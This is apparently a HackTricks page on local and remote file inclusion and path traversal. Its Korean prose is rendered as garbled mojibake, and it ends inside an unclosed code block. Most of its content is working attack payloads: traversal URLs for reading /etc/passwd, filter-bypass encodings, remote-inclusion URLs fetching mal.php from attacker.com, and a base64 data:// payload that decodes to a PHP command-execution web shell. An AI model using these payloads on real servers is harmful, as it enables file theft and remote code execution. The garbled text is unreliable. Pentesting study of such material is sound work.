# íŒŒì¼ í¬í•¨/ê²½ë¡œ íƒìƒ‰

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ì´ í’ë¶€í•œ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ì°¸ì—¬í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ ìˆëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ìµœì‹  ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

ì˜¤ëŠ˜ [**Discord**](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## íŒŒì¼ í¬í•¨

**ì›ê²© íŒŒì¼ í¬í•¨ (RFI):** íŒŒì¼ì´ ì›ê²© ì„œë²„ì—ì„œ ë¡œë“œë©ë‹ˆë‹¤ (ìµœê³ : ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ ì„œë²„ê°€ ì´ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤). PHPì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **ë¹„í™œì„±í™”**ë˜ì–´ ìˆìŠµë‹ˆë‹¤ (**allow\_url\_include**).\
**ë¡œì»¬ íŒŒì¼ í¬í•¨ (LFI):** ì„œë²„ê°€ ë¡œì»¬ íŒŒì¼ì„ ë¡œë“œí•©ë‹ˆë‹¤.

ì‚¬ìš©ìê°€ ì„œë²„ê°€ ë¡œë“œí•  íŒŒì¼ì„ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œë“  ì œì–´í•  ìˆ˜ ìˆì„ ë•Œ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.

ì·¨ì•½í•œ **PHP í•¨ìˆ˜**: require, require\_once, include, include\_once

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ í¥ë¯¸ë¡œìš´ ë„êµ¬: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## ë¸”ë¼ì¸ë“œ - í¥ë¯¸ë¡œìš´ - LFI2RCE íŒŒì¼
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**ì—¬ëŸ¬ \*nix LFI ëª©ë¡ì„ í˜¼í•©í•˜ê³  ë” ë§ì€ ê²½ë¡œë¥¼ ì¶”ê°€í•˜ì—¬ ì´ ëª©ë¡ì„ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/`ë¥¼ `\`ë¡œ ë³€ê²½í•´ ë³´ì„¸ìš”.\
`../../../../../`ë¥¼ ì¶”ê°€í•´ ë³´ì„¸ìš”.

ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ íŒŒì¼ /etc/passwordë¥¼ ì°¾ê¸° ìœ„í•´ ì—¬ëŸ¬ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ëŠ” ëª©ë¡ì€ [ì—¬ê¸°](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **Windows**

ë‹¤ì–‘í•œ ë‹¨ì–´ ëª©ë¡ì˜ ë³‘í•©:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/`ë¥¼ `\`ë¡œ ë³€ê²½í•´ ë³´ì„¸ìš”.\
`C:/`ë¥¼ ì œê±°í•˜ê³  `../../../../../`ë¥¼ ì¶”ê°€í•´ ë³´ì„¸ìš”.

ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ íŒŒì¼ /boot.inië¥¼ ì°¾ê¸° ìœ„í•´ ì—¬ëŸ¬ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ëŠ” ëª©ë¡ì€ [ì—¬ê¸°](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **OS X**

ë¦¬ëˆ…ìŠ¤ì˜ LFI ëª©ë¡ì„ í™•ì¸í•˜ì„¸ìš”.

## ê¸°ë³¸ LFI ë° ìš°íšŒ

ëª¨ë“  ì˜ˆì‹œëŠ” ë¡œì»¬ íŒŒì¼ í¬í•¨(Local File Inclusion)ì„ ìœ„í•œ ê²ƒì´ì§€ë§Œ ì›ê²© íŒŒì¼ í¬í•¨(Remote File Inclusion)ì—ë„ ì ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í˜ì´ì§€=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### ë¹„ì¬ê·€ì ìœ¼ë¡œ ì œê±°ëœ íƒìƒ‰ ì‹œí€€ìŠ¤
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ë„ ë°”ì´íŠ¸ (%00)**

ì œê³µëœ ë¬¸ìì—´ì˜ ëì— ë” ë§ì€ ë¬¸ìë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì„ ìš°íšŒí•©ë‹ˆë‹¤ (ìš°íšŒ: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
This is **PHP 5.4ë¶€í„° í•´ê²°ë¨**

### **ì¸ì½”ë”©**

ì´ì¤‘ URL ì¸ì½”ë”©(ë° ê¸°íƒ€)ì„ í¬í•¨í•œ ë¹„í‘œì¤€ ì¸ì½”ë”©ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### ê¸°ì¡´ í´ë”ì—ì„œ

ì•„ë§ˆë„ ë°±ì—”ë“œê°€ í´ë” ê²½ë¡œë¥¼ í™•ì¸í•˜ê³  ìˆìŠµë‹ˆë‹¤:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Exploring File System Directories on a Server

ì„œë²„ì˜ íŒŒì¼ ì‹œìŠ¤í…œì€ íŠ¹ì • ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ë¿ë§Œ ì•„ë‹ˆë¼ ë””ë ‰í† ë¦¬ë¥¼ ì‹ë³„í•˜ê¸° ìœ„í•´ ì¬ê·€ì ìœ¼ë¡œ íƒìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³¼ì •ì€ ë””ë ‰í† ë¦¬ ê¹Šì´ë¥¼ ê²°ì •í•˜ê³  íŠ¹ì • í´ë”ì˜ ì¡´ì¬ë¥¼ íƒìƒ‰í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•œ ìì„¸í•œ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. **Determine Directory Depth:** í˜„ì¬ ë””ë ‰í† ë¦¬ì˜ ê¹Šì´ë¥¼ í™•ì¸í•˜ë ¤ë©´ `/etc/passwd` íŒŒì¼ì„ ì„±ê³µì ìœ¼ë¡œ ê°€ì ¸ì˜µë‹ˆë‹¤(ì„œë²„ê°€ Linux ê¸°ë°˜ì¸ ê²½ìš° ì ìš©). ì˜ˆì‹œ URLì€ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì¡°í™”ë˜ì–´ ê¹Šì´ê°€ 3ì„ì„ ë‚˜íƒ€ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **í´ë” íƒìƒ‰:** ì˜ì‹¬ë˜ëŠ” í´ë”ì˜ ì´ë¦„(ì˜ˆ: `private`)ì„ URLì— ì¶”ê°€í•œ ë‹¤ìŒ `/etc/passwd`ë¡œ ëŒì•„ê°‘ë‹ˆë‹¤. ì¶”ê°€ ë””ë ‰í† ë¦¬ ìˆ˜ì¤€ì€ ê¹Šì´ë¥¼ í•˜ë‚˜ ì¦ê°€ì‹œì¼œì•¼ í•©ë‹ˆë‹¤:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **ê²°ê³¼ í•´ì„:** ì„œë²„ì˜ ì‘ë‹µì€ í´ë”ì˜ ì¡´ì¬ ì—¬ë¶€ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤:
* **ì˜¤ë¥˜ / ì¶œë ¥ ì—†ìŒ:** `private` í´ë”ëŠ” ì§€ì •ëœ ìœ„ì¹˜ì— ì¡´ì¬í•˜ì§€ ì•Šì„ ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.
* **`/etc/passwd`ì˜ ë‚´ìš©:** `private` í´ë”ì˜ ì¡´ì¬ê°€ í™•ì¸ë˜ì—ˆìŠµë‹ˆë‹¤.
4. **ì¬ê·€ íƒìƒ‰:** ë°œê²¬ëœ í´ë”ëŠ” ë™ì¼í•œ ê¸°ìˆ ì´ë‚˜ ì „í†µì ì¸ ë¡œì»¬ íŒŒì¼ í¬í•¨(LFI) ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ í•˜ìœ„ ë””ë ‰í† ë¦¬ë‚˜ íŒŒì¼ì„ ì¶”ê°€ë¡œ ì¡°ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

íŒŒì¼ ì‹œìŠ¤í…œì˜ ë‹¤ë¥¸ ìœ„ì¹˜ì—ì„œ ë””ë ‰í† ë¦¬ë¥¼ íƒìƒ‰í•˜ë ¤ë©´ í˜ì´ë¡œë“œë¥¼ ì ì ˆíˆ ì¡°ì •í•˜ì‹­ì‹œì˜¤. ì˜ˆë¥¼ ë“¤ì–´, `/var/www/`ì— `private` ë””ë ‰í† ë¦¬ê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´(í˜„ì¬ ë””ë ‰í† ë¦¬ê°€ ê¹Šì´ 3ì— ìˆë‹¤ê³  ê°€ì •) ë‹¤ìŒì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **ê²½ë¡œ ì˜ë¦¼ ê¸°ë²•**

ê²½ë¡œ ì˜ë¦¼ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ íŒŒì¼ ê²½ë¡œë¥¼ ì¡°ì‘í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤. ì´ëŠ” ì¢…ì¢… íŠ¹ì • ë³´ì•ˆ ì¡°ì¹˜ë¥¼ ìš°íšŒí•˜ì—¬ ì œí•œëœ íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ëª©í‘œëŠ” ë³´ì•ˆ ì¡°ì¹˜ì— ì˜í•´ ë³€ê²½ëœ í›„ì—ë„ ì—¬ì „íˆ ì›í•˜ëŠ” íŒŒì¼ì„ ê°€ë¦¬í‚¤ëŠ” íŒŒì¼ ê²½ë¡œë¥¼ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤.

PHPì—ì„œëŠ” íŒŒì¼ ì‹œìŠ¤í…œì˜ íŠ¹ì„±ìœ¼ë¡œ ì¸í•´ íŒŒì¼ ê²½ë¡œì˜ ë‹¤ì–‘í•œ í‘œí˜„ì´ ë™ë“±í•˜ê²Œ ê°„ì£¼ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, ë° `/etc/passwd/`ëŠ” ëª¨ë‘ ë™ì¼í•œ ê²½ë¡œë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤.
* ë§ˆì§€ë§‰ 6ìê°€ `passwd`ì¼ ë•Œ, `/`ë¥¼ ì¶”ê°€í•´ë„(`passwd/`) ëŒ€ìƒ íŒŒì¼ì€ ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* ë§ˆì°¬ê°€ì§€ë¡œ, íŒŒì¼ ê²½ë¡œì— `.php`ê°€ ì¶”ê°€ë  ê²½ìš°(`shellcode.php`ì™€ ê°™ì€), ëì— `/.`ì„ ì¶”ê°€í•´ë„ ì ‘ê·¼í•˜ëŠ” íŒŒì¼ì€ ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ì œê³µëœ ì˜ˆì‹œëŠ” ê²½ë¡œ ì˜ë¦¼ì„ ì‚¬ìš©í•˜ì—¬ `/etc/passwd`ì— ì ‘ê·¼í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ì´ëŠ” ë¯¼ê°í•œ ë‚´ìš©(ì‚¬ìš©ì ê³„ì • ì •ë³´)ìœ¼ë¡œ ì¸í•´ ì¼ë°˜ì ì¸ ëŒ€ìƒì…ë‹ˆë‹¤:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” í•„ìš”í•œ íƒìƒ‰ íšŸìˆ˜ê°€ ì•½ 2027íšŒì¼ ìˆ˜ ìˆì§€ë§Œ, ì´ ìˆ«ìëŠ” ì„œë²„ì˜ êµ¬ì„±ì— ë”°ë¼ ë‹¬ë¼ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **ì  ì„¸ê·¸ë¨¼íŠ¸ ë° ì¶”ê°€ ë¬¸ì ì‚¬ìš©**: íƒìƒ‰ ì‹œí€€ìŠ¤(`../`)ì™€ ì¶”ê°€ ì  ì„¸ê·¸ë¨¼íŠ¸ ë° ë¬¸ìë¥¼ ê²°í•©í•˜ì—¬ íŒŒì¼ ì‹œìŠ¤í…œì„ íƒìƒ‰í•  ìˆ˜ ìˆìœ¼ë©°, ì„œë²„ì— ì˜í•´ ì¶”ê°€ëœ ë¬¸ìì—´ì„ íš¨ê³¼ì ìœ¼ë¡œ ë¬´ì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **í•„ìš”í•œ íƒìƒ‰ íšŸìˆ˜ ê²°ì •**: ì‹œí–‰ì°©ì˜¤ë¥¼ í†µí•´ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ë¡œ íƒìƒ‰í•œ ë‹¤ìŒ `/etc/passwd`ë¡œ ì´ë™í•˜ëŠ” ë° í•„ìš”í•œ ì •í™•í•œ `../` ì‹œí€€ìŠ¤ ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ë•Œ ì¶”ê°€ëœ ë¬¸ìì—´(ì˜ˆ: `.php`)ì€ ì¤‘í™”ë˜ì§€ë§Œ ì›í•˜ëŠ” ê²½ë¡œ(`/etc/passwd`)ëŠ” ê·¸ëŒ€ë¡œ ìœ ì§€ë©ë‹ˆë‹¤.
* **ê°€ì§œ ë””ë ‰í† ë¦¬ë¡œ ì‹œì‘**: ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë””ë ‰í† ë¦¬(ì˜ˆ: `a/`)ë¡œ ê²½ë¡œë¥¼ ì‹œì‘í•˜ëŠ” ê²ƒì´ ì¼ë°˜ì ì¸ ê´€í–‰ì…ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ì˜ˆë°© ì¡°ì¹˜ë¡œ ì‚¬ìš©ë˜ê±°ë‚˜ ì„œë²„ì˜ ê²½ë¡œ êµ¬ë¬¸ ë¶„ì„ ë…¼ë¦¬ì˜ ìš”êµ¬ ì‚¬í•­ì„ ì¶©ì¡±í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

ê²½ë¡œ ë‹¨ì¶• ê¸°ìˆ ì„ ì‚¬ìš©í•  ë•ŒëŠ” ì„œë²„ì˜ ê²½ë¡œ êµ¬ë¬¸ ë¶„ì„ ë™ì‘ ë° íŒŒì¼ ì‹œìŠ¤í…œ êµ¬ì¡°ë¥¼ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ê° ì‹œë‚˜ë¦¬ì˜¤ëŠ” ë‹¤ë¥¸ ì ‘ê·¼ ë°©ì‹ì„ ìš”êµ¬í•  ìˆ˜ ìˆìœ¼ë©°, ê°€ì¥ íš¨ê³¼ì ì¸ ë°©ë²•ì„ ì°¾ê¸° ìœ„í•´ í…ŒìŠ¤íŠ¸ê°€ ì¢…ì¢… í•„ìš”í•©ë‹ˆë‹¤.

**ì´ ì·¨ì•½ì ì€ PHP 5.3ì—ì„œ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.**

### **í•„í„° ìš°íšŒ íŠ¸ë¦­**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## ì›ê²© íŒŒì¼ í¬í•¨

phpì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤. **`allow_url_include`**ê°€ **êº¼ì ¸** ìˆìŠµë‹ˆë‹¤. ì‘ë™í•˜ë ¤ë©´ **ì¼œì ¸** ìˆì–´ì•¼ í•˜ë©°, ì´ ê²½ìš° ì„œë²„ì—ì„œ PHP íŒŒì¼ì„ í¬í•¨í•˜ê³  RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
ë§Œì•½ ì–´ë–¤ ì´ìœ ë¡œ **`allow_url_include`**ê°€ **On**ì´ì§€ë§Œ PHPê°€ ì™¸ë¶€ ì›¹í˜ì´ì§€ì— ëŒ€í•œ ì ‘ê·¼ì„ **filtering**í•˜ê³  ìˆë‹¤ë©´, [ì´ í¬ìŠ¤íŠ¸ì— ë”°ë¥´ë©´](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), ì˜ˆë¥¼ ë“¤ì–´ base64ë¡œ ì¸ì½”ë”©ëœ PHP ì½”ë“œë¥¼ ë””ì½”ë“œí•˜ê³  RCEë¥¼ ì–»ê¸° ìœ„í•´ ë°ì´í„° í”„ë¡œí† ì½œì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
ì´ì „ ì½”ë“œì—ì„œ ìµœì¢… `+.txt`ëŠ” ê³µê²©ìê°€ `.txt`ë¡œ ëë‚˜ëŠ” ë¬¸ìì—´ì´ í•„ìš”í–ˆê¸° ë•Œë¬¸ì— ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ë¬¸ìì—´ì€ ê·¸ê²ƒìœ¼ë¡œ ëë‚˜ê³  b64 ë””ì½”ë“œ í›„ ê·¸ ë¶€ë¶„ì€ ë‹¨ìˆœí•œ ì“°ë ˆê¸°ë¥¼ ë°˜í™˜í•˜ë©° ì‹¤ì œ PHP ì½”ë“œê°€ í¬í•¨ë©ë‹ˆë‹¤(ë”°ë¼ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤).
{% endhint %}

ë˜ ë‹¤ë¥¸ ì˜ˆì‹œ **`php://` í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”** ê²½ìš°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root element

íŒŒì´ì¬ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œì—ì„œ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ì‚¬ìš©ìê°€ **`file_name`**ì— **ì ˆëŒ€ ê²½ë¡œ**ë¥¼ ì „ë‹¬í•˜ë©´, **ì´ì „ ê²½ë¡œê°€ ì œê±°ë©ë‹ˆë‹¤**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
It is the intended behaviour according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> ë§Œì•½ êµ¬ì„± ìš”ì†Œê°€ ì ˆëŒ€ ê²½ë¡œë¼ë©´, ëª¨ë“  ì´ì „ êµ¬ì„± ìš”ì†ŒëŠ” ë²„ë ¤ì§€ê³  ì ˆëŒ€ ê²½ë¡œ êµ¬ì„± ìš”ì†Œì—ì„œë¶€í„° ê²°í•©ì´ ê³„ì†ë©ë‹ˆë‹¤.

## Java ë””ë ‰í† ë¦¬ ëª©ë¡

Javaì—ì„œ ê²½ë¡œ íƒìƒ‰(Path Traversal)ì´ ë°œìƒí•˜ê³  **íŒŒì¼ ëŒ€ì‹  ë””ë ‰í† ë¦¬ë¥¼ ìš”ì²­**í•˜ë©´, **ë””ë ‰í† ë¦¬ ëª©ë¡ì´ ë°˜í™˜ë©ë‹ˆë‹¤**. ë‹¤ë¥¸ ì–¸ì–´ì—ì„œëŠ” ì´ëŸ° ì¼ì´ ë°œìƒí•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤(ë‚´ê°€ ì•„ëŠ” í•œ).

## ìƒìœ„ 25ê°œ ë§¤ê°œë³€ìˆ˜

ë‹¤ìŒì€ ë¡œì»¬ íŒŒì¼ í¬í•¨(LFI) ì·¨ì•½ì ì— ì·¨ì•½í•  ìˆ˜ ìˆëŠ” ìƒìœ„ 25ê°œ ë§¤ê°œë³€ìˆ˜ ëª©ë¡ì…ë‹ˆë‹¤(ì¶œì²˜: [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP í•„í„°ëŠ” ë°ì´í„°ê°€ ì½íˆê±°ë‚˜ ì“°ì´ê¸° ì „ì— ê¸°ë³¸ **ìˆ˜ì • ì‘ì—…ì„ ìˆ˜í–‰**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. í•„í„°ëŠ” 5ê°€ì§€ ë²”ì£¼ë¡œ ë‚˜ë‰©ë‹ˆë‹¤:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: ë°ì´í„°ì—ì„œ íƒœê·¸ë¥¼ ì œê±°í•©ë‹ˆë‹¤ (ëª¨ë“  "<"ì™€ ">" ë¬¸ì ì‚¬ì´ì˜ ë‚´ìš©)
* ì´ í•„í„°ëŠ” í˜„ëŒ€ PHP ë²„ì „ì—ì„œ ì‚¬ë¼ì¡ŒìŠµë‹ˆë‹¤.
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : ë‹¤ë¥¸ ì¸ì½”ë”©ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤(`convert.iconv.<input_enc>.<output_enc>`). **ì§€ì›ë˜ëŠ” ëª¨ë“  ì¸ì½”ë”© ëª©ë¡**ì„ ì–»ìœ¼ë ¤ë©´ ì½˜ì†”ì—ì„œ `iconv -l`ì„ ì‹¤í–‰í•˜ì„¸ìš”.

{% hint style="warning" %}
`convert.iconv.*` ë³€í™˜ í•„í„°ë¥¼ ì•…ìš©í•˜ë©´ **ì„ì˜ì˜ í…ìŠ¤íŠ¸ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì„ì˜ì˜ í…ìŠ¤íŠ¸ë¥¼ ì‘ì„±í•˜ê±°ë‚˜ include í”„ë¡œì„¸ìŠ¤ì™€ ê°™ì€ ê¸°ëŠ¥ì„ ë§Œë“¤ ë•Œ ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë” ë§ì€ ì •ë³´ëŠ” [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md)ë¥¼ í™•ì¸í•˜ì„¸ìš”.
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: ì½˜í…ì¸ ë¥¼ ì••ì¶•í•©ë‹ˆë‹¤ (ë§ì€ ì •ë³´ë¥¼ ìœ ì¶œí•  ë•Œ ìœ ìš©í•¨)
* `zlib.inflate`: ë°ì´í„°ë¥¼ ì••ì¶• í•´ì œí•©ë‹ˆë‹¤.
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : ì‚¬ìš© ì¤‘ë‹¨ë¨
* `mdecrypt.*` : ì‚¬ìš© ì¤‘ë‹¨ë¨
* ê¸°íƒ€ í•„í„°
* phpì—ì„œ `var_dump(stream_get_filters());`ë¥¼ ì‹¤í–‰í•˜ë©´ ëª‡ ê°€ì§€ **ì˜ˆìƒì¹˜ ëª»í•œ í•„í„°**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
* `consumed`
* `dechunk`: HTTP ì²­í¬ ì¸ì½”ë”©ì„ ì—­ì „ì‹œí‚µë‹ˆë‹¤.
* `convert.*`
```php
